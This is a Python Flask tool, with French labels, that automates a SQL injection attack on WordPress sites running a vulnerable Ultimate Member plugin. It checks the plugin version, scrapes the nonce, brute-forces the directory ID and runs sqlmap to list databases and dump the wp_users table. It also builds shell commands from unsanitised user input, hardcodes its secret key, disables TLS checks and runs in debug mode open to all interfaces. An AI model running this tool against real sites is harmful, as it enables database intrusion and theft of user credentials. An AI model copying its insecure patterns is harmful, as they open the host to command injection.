from flask import Flask, render_template, request, jsonify, session, send_file
import re
import hashlib
import requests
import subprocess
import os
import csv
from fpdf import FPDF
from datetime import datetime

app = Flask(__name__)
app.secret_key = "supersecretkey"

REPORT_DIR = "rapports"
os.makedirs(REPORT_DIR, exist_ok=True)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_filename(extension):
    return os.path.join(REPORT_DIR, f"sqlmap_rapport_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.{extension}")

def check_version(target):
    try:
        r = requests.get(f"{target}/wp-content/plugins/ultimate-member/readme.txt", verify=False)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
        if int(version.replace('.', '')) > 212 and int(version.replace('.', '')) < 283:
            return f"{version} - VULNÉRABLE!"
        else:
            return f"{version} - NON VULNÉRABLE!"
    except:
        return "Erreur lors de la vérification de la version."

def get_nonce(target):
    try:
        r = requests.get(f"{target}/index.php/register/", verify=False)
        nonce = re.search(r'um_scripts\s*=\s*\{[^}]*"nonce":"([^"]+)"', r.text).groups()[0]
        return nonce
    except:
        return "Erreur lors de la récupération du nonce."

def get_directory_id(target, nonce):
    for num in range(1, 100):
        id = hashlib.md5(str(num).encode()).hexdigest()[10:15]
        payload = {
            "action": "um_get_members",
            "nonce": nonce,
            "directory_id": id
        }
        response = requests.post(f"{target}/wp-admin/admin-ajax.php", data=payload, verify=False)
        if response.status_code == 200 and '"success":true' in response.text:
            return id
    return "Erreur lors de la récupération de l'ID."

def run_sqlmap(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=900)
        if result.returncode != 0:
            return f"Erreur lors de l'exécution de SQLMap: {result.stderr}"
        return result.stdout
    except Exception as e:
        return f"Erreur lors de l'exécution de SQLMap: {str(e)}"

@app.route("/", methods=["GET", "POST"])
def index():
    result = None
    if request.method == "POST":
        url = request.form.get("url")
        if url:
            version = check_version(url)
            nonce = get_nonce(url)
            dir_id = get_directory_id(url, nonce) if "Erreur" not in nonce else "Erreur"
            result = {
                "url": url,
                "version": version,
                "nonce": nonce,
                "directory_id": dir_id,
                "sqlmap_command": f'sqlmap -u {url}/wp-admin/admin-ajax.php --method POST --data "action=um_get_members&nonce={nonce}&directory_id={dir_id}&sorting=user_login" --dbms mysql --technique=T -p sorting --batch --answers=Y',
            }
            session["result"] = result
            session["sqlmap_outputs"] = []
    return render_template("index.html", result=result)

@app.route("/run_sqlmap", methods=["POST"])
def run_sqlmap_route():
    return run_and_store_output("tester les vulnérabilités")

@app.route("/run_sqlmap_dbs", methods=["POST"])
def run_sqlmap_dbs():
    return run_and_store_output("lister les bases de données", "--dbs")

@app.route("/run_sqlmap_tables", methods=["POST"])
def run_sqlmap_tables():
    return run_and_store_output("lister les tables", "-D wordpress --tables")

@app.route("/run_sqlmap_dump", methods=["POST"])
def run_sqlmap_dump():
    return run_and_store_output("dump wp_users", "-D wordpress -T wp_users --dump")

def run_and_store_output(action_label, extra_args=""):
    data = request.json
    url = data.get("url")
    nonce = data.get("nonce")
    directory_id = data.get("directory_id")

    command = f'sqlmap -u "{url}/wp-admin/admin-ajax.php" --method POST --data "action=um_get_members&nonce={nonce}&directory_id={directory_id}&sorting=user_login" --dbms mysql --technique=T -p sorting {extra_args} --batch --answers=Y'
    output = run_sqlmap(command)

    # Stocker le résultat
    outputs = session.get("sqlmap_outputs", [])
    outputs.append({"label": action_label, "output": output})
    session["sqlmap_outputs"] = outputs

    return jsonify({"output": output})

@app.route("/export/<format>")
def export_report(format):
    outputs = session.get("sqlmap_outputs", [])
    if not outputs:
        return "Aucune donnée à exporter."

    filename = generate_filename(format)
    if format == "txt":
        with open(filename, "w") as f:
            for entry in outputs:
                f.write(f"[{entry['label']}]\n{entry['output']}\n\n")

    elif format == "csv":
        with open(filename, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["Action", "Résultat"])
            for entry in outputs:
                writer.writerow([entry["label"], entry["output"]])

    elif format == "html":
        with open(filename, "w") as f:
            f.write("<html><body><h1>Rapport SQLMap</h1>")
            for entry in outputs:
                f.write(f"<h3>{entry['label']}</h3><pre>{entry['output']}</pre>")
            f.write("</body></html>")

    elif format == "pdf":
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=12)
        pdf.cell(200, 10, txt="Rapport SQLMap", ln=True, align='C')
        for entry in outputs:
            pdf.set_font("Arial", style='B', size=12)
            pdf.multi_cell(0, 10, f"\n{entry['label']}")
            pdf.set_font("Arial", size=10)
            pdf.multi_cell(0, 8, entry["output"])
        pdf.output(filename)

    else:
        return "Format non supporté."

    return send_file(filename, as_attachment=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5007, debug=True)
